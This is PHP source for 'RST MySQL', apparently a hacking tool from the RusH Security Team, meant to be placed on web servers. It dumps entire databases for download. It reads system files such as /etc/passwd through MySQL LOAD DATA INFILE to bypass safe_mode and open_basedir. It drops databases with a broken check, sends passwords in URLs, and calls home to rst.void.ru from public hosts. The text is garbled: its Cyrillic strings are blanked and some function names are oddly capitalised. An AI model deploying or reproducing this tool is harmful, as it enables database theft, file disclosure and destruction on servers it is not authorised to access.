<?php
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@set_magic_quotes_runtime(0); //       
$self=$HTTP_SERVER_VARS['PHP_SELF'];
if(!ini_GET("register_globals")){ 
import_request_variables("GPC"); 
}
// php  ,   .      
//,     ,    register_globals=on
if (GET_magic_quotes_gpc()) strips($GLOBALS);
function strips(&$el) { 
  if (is_array($el)) { 
    foreach($el as $k=>$v) { 
      if($k!='GLOBALS') { 
        strips($el[$k]); 
      } 
    } 
  } else { 
    $el = stripslashes($el); 
  } 
}
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    $file = "C:\\tmp\\dump_".$db.".sql";
    $p_v=$SystemRoot."\my.ini";
    $os="win";
} else {
    $file = "/tmp/dump_".$db.".sql"; 
    $p_v="/etc/passwd";
}
if ($HTTP_GET_VARS['send']=='send_http') {
function download($file, $type = false, $name = false, $down = false) { 
if(!file_exists($file)) exit; 
if(!$name) $name = basename($file); 
if($down) $type = "application/force-download"; 
else if(!$type) $type = "application/download"; 
$disp = $down ? "attachment" : "inline";
header("Content-disposition: ".$disp."; filename=".$name); 
header("Content-length: ".filesize($file)); 
header("Content-type: ".$type); 
header("Connection: close"); 
header("Expires: 0");
set_time_limit(0); 
readfile($file); 
unlink($file);
exit; 
} 
if ($HTTP_GET_VARS['strukt']=='d_strukt_bd' && $HTTP_GET_VARS['dump']=='bd'){
   $host = $HTTP_SERVER_VARS["SERVER_NAME"];
   $ip = $HTTP_SERVER_VARS["SERVER_ADDR"];
   $connection=mysql_connect($server.":".$port, $login, $passwd) or die("$h_error<b>".mysql_error()."</b>$f_error");
   mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");
   if (sizeof($tabs) == 0) { 
      //     
      $res = mysql_query("SHOW TABLES FROM $db", $connection); 
      if (mysql_num_rows($res) > 0) { 
         while ($row = mysql_fetch_row($res)) { 
            $tabs[] .= $row[0]; 
         } 
      } 
   } 
       //      
   $fp = fopen($file, "w"); 
   fputs ($fp, "# RST MySQL tools\n# Home page: http://rst.void.ru\n#\n# Host settings:\n# MySQL version: (".mysql_GET_server_info().")\n# Date: ".
   date("F j, Y, g:i a")."\n# ".$host." (".$ip.")"." dump db \"".$db."\"\n#____________________________________________________________\n\n"); 
   foreach($tabs as $tab) {       
      if ($add_drop) { 
         fputs($fp, "DROP TABLE IF EXISTS `".$tab."`;\n");
      }        
      //       
      $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $connection) or die(mysql_error()); 
      $row = mysql_fetch_row($res); 
      fputs($fp, $row[1].";\n\n"); 
       
      //    
      $res = mysql_query("SELECT * FROM `$tab`", $connection); 
      if (mysql_num_rows($res) > 0) { 
         while ($row = mysql_fetch_assoc($res)) { 
            $keys = implode("`, `", array_keys($row)); 
            $values = array_values($row); 
            foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
            $values = implode("', '", $values); 
            $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n"; 
            fputs($fp, $sql); 
         } 
      } 
      fputs ($fp, "#---------------------------------------------------------------------------------\n\n"); 
   } 
   fclose($fp);
}
if ($HTTP_GET_VARS['strukt']=='d_strukt'){
   $host = $HTTP_SERVER_VARS["SERVER_NAME"];
   $ip = $HTTP_SERVER_VARS["SERVER_ADDR"];
   $connection=mysql_connect($server.":".$port, $login, $passwd) or die("$h_error<b>".mysql_error()."</b>$f_error");
   mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");
   $fp = fopen($file, "w"); 
   fputs ($fp, "# RST MySQL tools\r\n# Home page: http://rst.void.ru\r\n#\n# Host settings:\n# $host ($ip)\n# MySQL version: (".mysql_GET_server_info().")\n# Date: ".
   date("F j, Y, g:i a")."\n# "." dump db \"".$db."\" table \"".$tbl."\"\n#_________________________________________________________\n\n"); 
      //       
      $res = mysql_query("SHOW CREATE TABLE `".$tbl."`", $connection) or die("$h_error<b>".mysql_error()."</b>$f_error"); 
      $row = mysql_fetch_row($res); 
      fputs($fp, "DROP TABLE IF EXISTS `".$tbl."`;\n");
      fputs($fp, $row[1].";\n\n");        
      //    
      $res = mysql_query("SELECT * FROM `$tbl`", $connection); 
      if (mysql_num_rows($res) > 0) { 
         while ($row = mysql_fetch_assoc($res)) { 
            $keys = implode("`, `", array_keys($row)); 
            $values = array_values($row); 
            foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
            $values = implode("', '", $values); 
            $sql = "INSERT INTO `$tbl`(`".$keys."`) VALUES ('".$values."');\n"; 
            fputs($fp, $sql); 
         } 
      }
 
   fclose($fp); 
}
if ($HTTP_GET_VARS['strukt']=='t_strukt'){
   $host = $HTTP_SERVER_VARS["SERVER_NAME"];
   $ip = $HTTP_SERVER_VARS["SERVER_ADDR"];
   $connection=mysql_connect($server.":".$port, $login, $passwd) or die("$h_error<b>".mysql_error()."</b>$f_error");
   mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");
   $fp = fopen($file, "w"); 
   fputs ($fp, "# RST MySQL tools\r\n# Home page: http://rst.void.ru\r\n#\n# Host settings:\n# $host ($ip)\n# MySQL version: (".mysql_GET_server_info().")\n# Date: ".
   date("F j, Y, g:i a")."\n# "." dump db \"".$db."\" table \"".$tbl."\"\n#_________________________________________________________\n\n"); 
      $res = mysql_query("SHOW CREATE TABLE `".$tbl."`", $connection) or die("$h_error<b>".mysql_error()."</b>$f_error"); 
      $row = mysql_fetch_row($res); 
      fputs($fp, "DROP TABLE IF EXISTS `".$tbl."`;\n");
      fputs($fp, $row[1].";\n\n");   
   fclose($fp);
}
if ($HTTP_GET_VARS['strukt']=='d'){
   $host = $HTTP_SERVER_VARS["SERVER_NAME"];
   $ip = $HTTP_SERVER_VARS["SERVER_ADDR"];
   $connection=mysql_connect($server.":".$port, $login, $passwd) or die("$h_error<b>".mysql_error()."</b>$f_error");
   mysql_select_db($db) or die("$h_error<b>".mysql_error()."</b>$f_error");
   $fp = fopen($file, "w"); 
      $res = mysql_query("SELECT * FROM `$tbl`", $connection); 
      if (mysql_num_rows($res) > 0) { 
         while ($row = mysql_fetch_assoc($res)) { 
            $keys = implode("`, `", array_keys($row)); 
            $values = array_values($row); 
            foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
            $values = implode("', '", $values); 
            $sql = "INSERT INTO `$tbl`(`".$keys."`) VALUES ('".$values."');\n"; 
            fputs($fp, $sql); 
         } 
      } 
   fclose($fp); 
}
download($f_dump);
}
function send_header() {
   header("Content-type: image/gif");
   header("Cache-control: public");
   header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
   header("Cache-control: max-age=".(60*60*24*7));
   header("Last-Modified: ".date("r",filemtime(__FILE__)));
}
if ($HTTP_GET_VARS['img']=='st_form_bg') {
   $st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';
   send_header();
   echo base64_decode($st_form_bg);
}
if ($HTTP_GET_VARS['img']=='bg_f') {
$bg_f='R0lGODlhAQARAMQAANXW1+7w8uvt79TV18jJye3w8+zu8Ofp7MfIydzd3+fo687P0Nvc3eHi5eP'.
      'k5sPDw87OzwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BA'.
      'AAAAAALAAAAAABABEAAAUP4IMsQOIcRlAISsMMEBECADs=';
   send_header();
   echo base64_decode($bg_f);
}
if ($HTTP_GET_VARS['img']=='b_close') {
$b_close='R0lGODlhdwAUAOYAANWEhdJYWNiwsc0PD9aTk88sLNA7O9rNztehotR1dk0AANQnJ4IAANc1Ndg9PWYAAL4'.
         'AAM8PD6AAANg8POiLi8yEhb0sLIYAAGIAAMRYWOeGhtc5Oc8NDeR3d1gAANuEhU4AAKcAANJbW9Z1dt1XV8'.
         'IAAONzc8QAAOqXl6gAAO2kpOJvb9IeHtuOj88QENYwMHUAANASEt9hYbAAAIwAAHkAAD0AAL0AAN5aWtQpK'.
         'c4MDNROT0UAAKwAANtJSdQqKtAUFOqYmMwCAuR2dtuiou2jo95bW8l1dtc3N+ucnI4AAJMAAHoAAD4AANWK'.
         'i+yfn5IAAOuZmdaVls4KCtlAQJQAAEAAANtMTOFra3EAAJEAALgAAOFpaWcAAOeFhXAAAN9dXeqVlTcAANg'.
         '6Ol4AANNnZ9m/wLUAANEbG9tKSoQAAOiOjuaCglYAAOJsbDQAANvc3cwAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
         'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAB3ABQAAAf/gFFFKk9ha4eIiYqLjI2Oj5CRk'.
         'pOJGiY4GxwUQUkoFGygoaKjpKWmp6ipqqusokNGSBwzHV4UGh1uubq7vL2+v8DBwsPExbtgYy5nSjJYK1wk'.
         'adLT1NXW19jZ2tvc1h8tRB/d2BsxW0tZPldpVD9o7/Dx8vP09fb3+PnxO3D9cCP66k05UwWGBwcTGiyIEKe'.
         'hw4cQI0qcSLGixYsOB8A5UKYAxooQJDB4oAChQoYNBfgzEIeAvwQNzcg0w3KASzhmBrQ0A2CjTgJm4pShac'.
         'BMmThmCAg1OnQmgaEsIwLteeDnyzg9AwCA2fCmgAFFZ8pUGkdAzoYhR5ZMuLChgQMA/xDgjAP3ZhwD/Q7MV'.
         'UlAJYI4/QjohdkPKZwBPcvgRVCgXxmg/Yyq9Bgx8GC6AOz66/dXLgK+QyNDFgrnL1qRJE22bTggQBk4AOK0'.
         '7gmHdAKNAPAKCBAAZ2MBcXoD+A249uTXCfTCYUm8OIDhD4kLl621n8acGuE0n1s8ZW0z2h2mTc0WJWmfrzf'.
         'OvWmdtj8Er2P3ThCfeGGXB5Q3jC97c22H/M2Xnl5mTGdYAnAcBVhQ1zWUWGkPjbfWSRC95gQcwE0HXnXPJf'.
         'hQVi0tl1V8DYK3HHcgTqfXh3AEEKIIGAYHm4E4gYicjLGdF554qE24WoIBqCQFhgHodVQ/AKhUxv9rHJUhQ'.
         'FEJvhYUeJAhIFdsjvVGFng69SSAS0E5BN6SOPW2m5HZBRllaWXo5VFiDfUGYYQ9qsYQXv585V8BeAbWkFz+'.
         'FOePR/75o1iMCCpYWFmbRdXQntkNipU/OSq3nHeO9kMZj2rZ6RBvlLWmk0UFBMAchqV+pCpEv6XKWgCjOlR'.
         'qrHe5ONFrptHZaXmrWsRfr8D+CqxF/TjKKUkv5MCCDiWc4eyz0EYrrbQZVGDBtNhmq62z1V677bfSWlDBEd'.
         'OGQMMXHvAAhBA3pKCFGvDGK++89NZr77345qvvvvzKywQGIFjxxgk9QFEDBm0krPDCDDfs8MMQRyzxxBRXv'.
         'DArCDa8oXEIF3ShgBgahyzyyCSXbPLJKKes8soso3wBGU20LPPMNNdsc8qBAAA7';
   send_header();
   echo base64_decode($b_close);
} 
$n_img = create_function('$tag,$f_n,$img_c', 'print \'<\'.$tag.\'>\';$f_n("$img_c");');
$h_error="<br><table align=center width=500 height=70 bgcolor=red><b>  :</b><tr><td align=center><br><h5>";
$f_error="</h5></td></tr></table>
<CENTER><FORM><INPUT type=\"button\" value=\"   <<     \" onClick=\"history.go(-1)\"><BR>
</FORM></CENTER>
</td></tr></table></td></tr></table>
<table align=center width=100% cellpadding=0 cellspacing=1 bgcolor=#000000>
<tr><td>
      <table background=".$self."?img=bg_f align=center border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#C2C2C2>
         <tr>
            <td align=center>
                free script &copy;RusH Security Team 
            </td>
         </tr>
      </table> 
</td></tr>
</table>
</td></tr></table>";

 print "
  <html><HEAD><TITLE>RST MySQL</TITLE>

  <META http-equiv=Content-Type Pragma: no-cache; content=\"text/html; charset=windows-1251\">
   <style>
   td {  
   font-family: verdana, arial, ms sans serif, sans-serif;  
   font-size: 11px;  
   color: #000000; 
   }
   BODY {
   margin-top: 4px; 
   margin-right: 4px; 
   margin-bottom: 4px; 
   margin-left: 4px;
   scrollbar-face-color: #b6b5b5;
   scrollbar-highlight-color: #758393; 
   scrollbar-3dlight-color: #000000; 
   scrollbar-darkshadow-color: #101842; 
   scrollbar-shadow-color: #ffffff; 
   scrollbar-arrow-color: #000000;
   scrollbar-track-color: #ffffff; 
   }
   A:link {COLOR:blue; TEXT-DECORATION: none}
   A:visited { COLOR:blue; TEXT-DECORATION: none}
   A:active {COLOR:blue; TEXT-DECORATION: none}
   A:hover {color:red;TEXT-DECORATION: none}
   input, textarea, select {
   background-color: #EBEAEA;
   border-style: solid;
   border-width: 1px;
   font-family: verdana, arial, sans-serif;
   font-size: 11px;
   color: #333333;
   padding: 0px;
   }
  </style></HEAD><BODY>";


if ($sapi_type == "cgi") {
    $php_type="CGI";
} else {
    $php_type="";
}

$form_file="
        <table width=80% align=center border=0>
        <tr><td align=center>&nbsp;&nbsp;,&nbsp;&nbsp;(&nbsp;<b>$server</b>&nbsp;)</td></tr>
        <tr><td>
        <table cellpadding=5 cellspacing=1 bgcolor=#FFFFFF border=0>
        <tr bgcolor=#DBDCDD><td align=center>
         ,     <b></b>  
            <b>FILE</b>, <b>SELECT</b>,
        <b>CREATE</b>,     -    .
           <b>safe_mode</b>  <b>safe_basedir</b>
        </td></tr></table></td></tr>
        <form method=\"GET\" action=\"$self?f=x_file\">
        <input type=\"hidden\" name=\"s\" value=\"$s\">                
        <input type=\"hidden\" name=\"server\" value=\"$server\">
        <input type=\"hidden\" name=\"port\" value=\"$port\">
        <input type=\"hidden\" name=\"login\" value=\"$login\">
        <input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
        <tr><td align=center><br>   : <input type=\"text\" name=\"p_file\" value=\"$p_v\" size=\"40\">&nbsp;&nbsp;&nbsp;&nbsp;
        <input type=\"submit\" value=\" \">&nbsp;&nbsp;&nbsp;&nbsp;</td></tr></table><br>";

$start_form="<br>
<table align=center border=0 width=100% cellpadding=2 cellspacing=0 bgcolor=#FFFFFF>
 <tr>
   <td>
<table align=center width=80% cellpadding=0 cellspacing=1 bgcolor=#000000>
<tr><td>
      <table background=".$self."?img=bg_f border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#C2C2C2>
         <tr>
            <td width=25>
                <font face=Webdings size=6>&#0325;</font>
            </td>
            <td>
                <font size=4><b>RST MySQL</b></font> <font color=#FFFFFF><b>v(2.0)</b></font>
            </td>
            <td width=33% align=right>
                ".date ("j F- Y- g:i")."&nbsp;&nbsp;
            </td>
         </tr>
      </table> 
</td></tr>
</table>

</td></tr>
<tr><td>

<table align=center border=0 width=80% cellpadding=2 cellspacing=0 bgcolor=#FFFFFF>
 <tr>
   <td bgcolor=#DBDCDD valign=top width=200><br>
        <center><b>    MySQL</b></center><hr width=98%>
        <li>   .
        <li>   .
        <li>   .
        <li>   .<hr width=98%>
        Type - FREE<br>
        Home page: <a href=http://rst.void.ru><b>http://rst.void.ru</b></a>
        <center><br><br><font face=Webdings size=+18 color=#B6B5B5>&#0168;</font><center>
   </td>
   <td background=".$self."?img=st_form_bg bgcolor=#E6E7E9><center><font size=2>
        <br>    MySQL  <b></b>, <b></b> ( MySQL)   <b></b>.</font></center><br>
        <li>   mysql   ,      .
        <li>   mysql   ,     .
        <li>   mysql   ,    <b>localhost</b>
        <li>    mysql   ,     ,  (<b>3306</b>)<br><br>
        <center> PHP (<b>".phpversion()."</b>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ID PHP script (<b>".GET_current_user( )."</b>)</center>
        <br><table align=center>
        <tr><td>  MySQL</td><td align=right>  MySQL&nbsp;</td></tr>
        <form method=\"GET\" action=\"$self\">
        <input type=\"hidden\" name=\"s\" value=\"y\">
        <tr>
          <td><input type=\"text\" name=\"login\" value=\"root\" maxlength=\"64\"></td>
          <td align=right><input type=\"text\" name=\"passwd\" value=\"$passwd\" maxlength=\"64\"></td>
        </tr>
        <tr><td> MySQL</td><td></td></tr>
        <tr>                
          <td><input type=\"text\" name=\"server\" value=\"localhost\" maxlength=\"64\"></td>
          <td><input type=\"text\" name=\"port\" value=\"3306\" maxlength=\"6\" size=\"3\">
          <input type=\"submit\" value=\"\"></td>
        </tr></table><br>        
   </td>
 </tr>
</table>

</td></tr>
<tr><td>
<table align=center width=80% cellpadding=0 cellspacing=1 bgcolor=#000000>
<tr><td>
      <table background=".$self."?img=bg_f align=center border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#C2C2C2>
         <tr>
            <td align=center>
                free script &copy;RusH Security Team 
            </td>
         </tr>
      </table> 
</td></tr>
</table>
</td></tr></table><center><font size=-1 color=#D0D1D2>(coded by dinggo)</font></center>
";

if ($os =='win') {
$os="OS- <b>".$HTTP_ENV_VARS["OS"]."</b>";
}else{
   $str_k=$_ENV["BOOT_FILE"];
   $k=preg_replace ("/[a-zA-Z\/]/","", $str_k);
   $os="OS\Kernel: <b>".$_ENV["BOOT_IMAGE"].$k."</b>";

}

if (!isset($s) || $HTTP_GET_VARS[s] != 'y') { print $start_form;
 $serv = array(127,192,172,10);
 $adrr=@explode('.', $HTTP_SERVER_VARS["SERVER_ADDR"]);
 if (!in_array($adrr[0], $serv)) {
   //       
   //       
   @print "<img src=\"http://rst.void.ru/version_sql/version.php\" border=0 height=0>";
   @readfile ("http://rst.void.ru/version_sql/version.php");  
 }
exit;
}

$form_ad_b="<br>
<table width=80% align=center border=0 cellpadding=0 cellspacing=1 bgcolor=#FFFFFF> 
 <tr>
   <td>
   <table width=100% align=center border=0 cellpadding=4 cellspacing=0 bgcolor=#DBDCDD> 
    <td>
      MySQL <b>$server</b> v.(<b>".mysql_GET_server_info()."</b>)
   </td>
   <td align=center>
      <b>".$HTTP_SERVER_VARS["SERVER_SOFTWARE"]."</b>
   </td>
   <td align=right>
       PHP (<b>".phpversion()."</b>) $php_type
   </td>
 </tr>
 <tr bgcolor=#DBDCDD>
   <td>
      IP:<b>".$HTTP_SERVER_VARS["SERVER_ADDR"]."</b> Name:<b>".$HTTP_SERVER_VARS["SERVER_NAME"]."</b>
   </td>
   <td align=center>
      ID PHP script (<b>".GET_current_user( )."</b>)
   </td>
   <td align=right>
      $os
   </td>
 </tr>
 </table>
</td></tr></table>
<table width=80% align=center border=0 cellpadding=5 cellspacing=1> 
 <tr>
   <td>
        <a href=\"$self?s=$s&stat=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\"><b> MySQL</b></a>
   </td>
   <td align=center>
        <a href=\"$self?s=$s&php=ok\" tarGET=\"_blank\"><b> PHP (ALL)</b></a>
   </td>
   <td align=right>
        <a href=\"$self?s=$s&proc=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\"><b> MySQL </b></a>
   </td>
 </tr>
 <tr>
   <td>
        <a href=\"$self?s=$s&apc=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\"><b> Apache </b></a>
   </td>
   <td align=center>
        <a href=\"$self?s=$s&var=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\"><b> MySQL </b></a> 
   </td>
   <td align=right>
        <a href=\"$self?s=$s&f=x_file&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"       safe_mode  safe_mode_exec_dir\"><b> *?</b></a>
   </td>
 </tr>
</table><br>

<table width=300 align=center cellpadding=0 cellspacing=1 bgcolor=#FFFFFF>
<tr bgcolor=#DBDCDD><td>
<table align=center cellpadding=0 cellspacing=0>
 <tr bgcolor=#DBDCDD>
   <td> <table cellpadding=4><tr><td><b>   </b></td></tr><tr><td>
        <form method=\"GET\" action=\"$self?s=$s&login=$login&passwd=$passwd&server=$server&port=$port\">
        <input type=\"hidden\" name=\"s\" value=\"$s\">
        <input type=\"hidden\" name=\"server\" value=\"$server\">
        <input type=\"hidden\" name=\"port\" value=\"$port\">
        <input type=\"hidden\" name=\"login\" value=\"$login\">
        <input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
        <input type=\"text\" name=\"new_db\" value=\"\" maxlength=\"64\">
        <input type=\"submit\" value=\"\"></td>
        </tr></table>
   </td>
 </tr>
</table>
</td>    
</tr></table></form>

<table width=80% align=center border=0 cellpadding=0>
 <tr align=right>
   <td width=85%></td>
   <td width=15>
    <a href=$self><img src=".$self."?img=b_close border=0 title=close></a>
  </td>
 </tr>
</table>
";
        
$cnt_b=mysql_num_rows(mysql_list_dbs());  // -  mysql   
print "
<table align=center border=0 width=100% cellpadding=1 cellspacing=0 bgcolor=#FFFFFF>
 <tr>
   <td>
<table align=center width=100% cellpadding=0 cellspacing=1 bgcolor=#000000>
<tr><td>
      <table background=".$self."?img=bg_f border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#C2C2C2>
         <tr>
            <td>
                <font face=Webdings size=6>&#0325;</font>
            </td>
            <td width=33%>
                <font size=4><b>RST MySQL</b></font>
            </td>
            <td width=33% align=center>
                <font color=blue><b>$server</b></font>&nbsp;[CONNECTION Ok] &nbsp;&nbsp; : <b>$cnt_b</b>
            </td>
            <td width=33% align=right>
                ".date ("j F- Y- g:i")."&nbsp;&nbsp;
            </td>
         </tr>
      </table> 
</td></tr>
</table>

</td></tr>
<tr><td>

<table background=".$self."?img=send_img align=center border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#FFFFFF>
 <tr>
   <td bgcolor=#DBDCDD valign=top width=170>";

if (isset($server)&&isset($port)&&isset($login)&&isset($passwd)){
 $connection = mysql_connect($server.":".$port, $login, $passwd) or die("$header<table align=center width=80% bgcolor=red><tr><br>   MySQL  <b>$server</b><td><center><font size=2><b>".mysql_error()."</b></font></center><br><b> :</b><li>    <b>$server</b><li>    <b>$port</b><li>   (login)  mysql <b>$login</b><li>   (password)  mysql <b>$passwd</b><li>   $server    <b>".GETenv('REMOTE_ADDR')."</b><li>    </td></tr></table><br></td></tr></table><script>alert('     MySQL  $server \\n\\n    :\\n\\n $server\\n $port\\n $login\\n $passwd');</script><head><META HTTP-EQUIV='Refresh' CONTENT='0;url=$self'></head>");
}


/*---------------------- L E F T   B L O C K (menu bd)! -------------------*/
/*   */
if ($connection&&!isset($db)) {
   print "<table border=0 cellpadding=0 cellspacing=1 width=100% bgcolor=#FFFFFF><tr><td bgcolor=#B6B5B5 align=center>".
           "<a href=\"$self?s=$s&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"      \"><font color=green><b>".
           "&nbsp;&nbsp;</b></font></a></td></tr></table>";
   
   $result = mysql_list_dbs($connection) or die("$h_error<b>".mysql_error()."</b>$f_error");
   while ( $row=mysql_fetch_row($result) ){
       $cnt_title=mysql_num_rows(mysql_list_tables($row[0])); //-     
       print "<table valign=top border=0 width=100% cellpadding=0 cellspacing=1 bgcolor=#FFFFFF><tr><td bgcolor=#DBDCDD>";
       if ($cnt_title < 1) {
         print "<a href=\"$_SERVER[PHP_SELF]?s=$s&db=$row[0]&cr_tbl=new&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"  $cnt_title\"><b>$row[0]</b></a>";
       }else{
         print "<a href=\"$_SERVER[PHP_SELF]?s=$s&db=$row[0]&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"  $cnt_title\"><b>$row[0]</b></a>";
       }
       print "</td></tr></table>";
    }
}

//    
if (isset($db)){          
  $result=mysql_list_tables($db) or die ("$h_error<b>".mysql_error()."</b>$f_error<head><META HTTP-EQUIV='Refresh' CONTENT='5;url=$self?s=$s&login=$login&passwd=$passwd&server=$server&port=$port'></head>");
   print "<table border=0 cellpadding=0 cellspacing=1 width=100% bgcolor=#FFFFFF><tr><td bgcolor=#B6B5B5 align=center>".
           "<a href=\"$self?s=$s&login=$login&passwd=$passwd&server=$server&port=$port\"><font color=green><b>".
           "&nbsp;&nbsp;</b></font></a></td></tr><tr><td></td></tr><tr><td></td></tr></table>";

  print "<table cellpadding=0 cellspacing=1 width=100% bgcolor=#FFFFFF><tr><td bgcolor=silver align=center>".
        "---[ <a href=\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db\" title=\"  \"><b>$db</b></a>".
        " ]---</a></td></tr><tr><td></td></tr><tr><td></td></tr></table>";

  while ( $row=mysql_fetch_array($result) ){
    //  ()  
    $count=mysql_query ("SELECT COUNT(*) FROM $row[0]");
    $count_row= mysql_fetch_array($count);
    print "<table valign=top border=0 width=100% cellpadding=0 cellspacing=1 bgcolor=#FFFFFF>".
          "<tr><td bgcolor=#DBDCDD>";
    if ($count_row[0] < 1) { 
       print "<a href=\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&tbl=$row[0]&nn_row=ok\">$row[0]</a>&nbsp;($count_row[0])</td></tr></table>";  
    }else{
        print "<a href=\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&tbl=$row[0]&limit_start=0&limit_count=5\">$row[0]</a>&nbsp;($count_row[0])</td></tr></table>";  
    }
    @mysql_free_result($count);
  }
} 

/*---------------------- END L E F T   B L O C K (menu bd)! -------------------*/

print "
   </td>
   <td valign=top bgcolor=#E6E7E9>";

/*------------------------ R I G H T   B L O C K ! -----------------------*/
if ($connection&&!isset($db)) { 
$anon = @mysql_query("SELECT Host,User FROM mysql.user WHERE User=''", $connection); 
if (mysql_num_rows($anon)>0) { print "<table align=center><tr><td><b>!<b></td></tr><tr><td bgcolor=red>      MySQL</td></tr></table>"; }
print $form_ad_b; 
}
/*------------- MySql------------*/
if (isset($proc) && $proc=="TRUE"){
$result = mysql_query("SHOW PROCESSLIST", $connection); 
 print "<center><font size=2> MySQL  [ <b>$server</b> ]</font><center><table align=center border=0 cellpadding=0 cellspacing=1 width=80% bgcolor=#FFFFFF><tr align=center bgcolor=#B6B5B5><td>ID</td><td>USER</td><td>HOST</td><td>DB</td><td>COMMAND</td><td>TIME</td><td>STATE</td><td>INFO</td></tr>";
 while ($row = mysql_fetch_array($result, MYSQL_NUM)) {
   print "<tr bgcolor=#DAD9D9><td>$row[0]</td><td>$row[1]</td><td>$row[2]</td><td>$row[3]</td><td>$row[4]</td><td>$row[5]</td><td>$row[6]</td><td>$row[7]</td></tr>";  
 } 
  print "</table><br>";
 mysql_free_result($result);
 unset($proc);
}

/*  */
if (isset($HTTP_GET_VARS['new_db'])){
    $new_db=trim($HTTP_GET_VARS['new_db']);
    if (mysql_create_db ($new_db)) {
        print ("<center><font size=2> <b>$new_db</b>  </font></center><br>");
        print "<head><META HTTP-EQUIV='Refresh' CONTENT='0;url=$self?s=$s&login=$login&passwd=$passwd&server=$server&port=$port'></head>";
    } else {
        print "$h_error".mysql_error()."$f_error <head><META HTTP-EQUIV='Refresh' CONTENT='5;url=$self?s=$s&login=$login&passwd=$passwd&server=$server&port=$port'></head>";
    }
    unset($new_db);
}

/* */
if (isset($HTTP_GET_VARS['drop'])){
     $result_d = mysql_list_dbs($connection) or die("<td bgcolor=#DAD9D9>$h_error".mysql_error()."$f_error</td></tr></table>");
     while ( $row_d=mysql_fetch_row($result_d) ){
        if ($drop==$row_d[0]) $dr="TRUE";
     }
 if ($dr="TRUE") { 
 mysql_drop_db($drop,$connection);
 print ("<center><font size=2> <b>$drop</b>  </font></center><br>");
 print "<head><META HTTP-EQUIV='Refresh' CONTENT='0;url=$self?s=$s&login=$login&passwd=$passwd&server=$server&port=$port'></head>";
 }
unset($drop);
}

/*-------------   -----------*/
if (isset($f)){
print $form_file;
}
if(isset($p_file)){ 
  mysql_create_db("tmp_bd") or die("$h_error<b>".mysql_error()."</b>$f_error");
  mysql_select_db("tmp_bd") or die("$h_error<b>".mysql_error()."</b>$f_error"); 
  mysql_query('CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );') or die("$h_error<b>".mysql_error()."</b>$f_error");
  mysql_query("LOAD DATA INFILE \"".addslashes($p_file)."\" INTO TABLE tmp_file");
 $query = "SELECT * FROM tmp_file";
 $result = mysql_query($query) or die("$h_error<b>".mysql_error()."</b>$f_error");
  /*  */
  for ($i=0;$i<mysql_num_fields($result);$i++){
   $name=mysql_field_name($result,$i);
  } 
  print "<table align=center border=0 cellpadding=5 cellspacing=1 width=90% bgcolor=#FFFFFF><tr><td align=center bgcolor=#DBDCDD>$name</td></tr>
        <tr><td background=".$self."?img=st_form_bg bgcolor=#ECEDEE>
        <form method=\"GET\" action=\"$self?f=x_file\">
        <input type=\"hidden\" name=\"s\" value=\"$s\">                
        <input type=\"hidden\" name=\"server\" value=\"$server\">
        <input type=\"hidden\" name=\"port\" value=\"$port\">
        <input type=\"hidden\" name=\"login\" value=\"$login\">
        <input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
           : <input type=\"text\" name=\"p_file\" value=\"$p_file\" size=\"40\">&nbsp;&nbsp;&nbsp;&nbsp;
        <input type=\"submit\" value=\" \"></form>
  ";
  while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
      foreach ($line as $key =>$col_value) {          
          print htmlspecialchars($col_value)."<br>";
      }
  }
  mysql_free_result($result);
  print "</td></tr></table><br>";
  mysql_drop_db("tmp_bd") or die("$h_error<b>".mysql_error()."</b>$f_error");
} 

/*--------------  Apache------------*/
if (isset($apc) && $apc=="TRUE"){
 print "<center><font size=2>  Apache [ <b>$server</b> ]</font><center>
 <table align=center border=0 cellpadding=0 cellspacing=1 width=80% bgcolor=#FFFFFF>
  <tr align=center bgcolor=#B6B5B5>
   <td></td><td></td>
  </tr> 
  <tr bgcolor=#DAD9D9><td> Internet-</td><td>".$HTTP_SERVER_VARS["SERVER_NAME"]."</td></tr>
  <tr bgcolor=#DAD9D9><td>IP- </td><td>".$HTTP_SERVER_VARS["SERVER_ADDR"]."</td></tr>
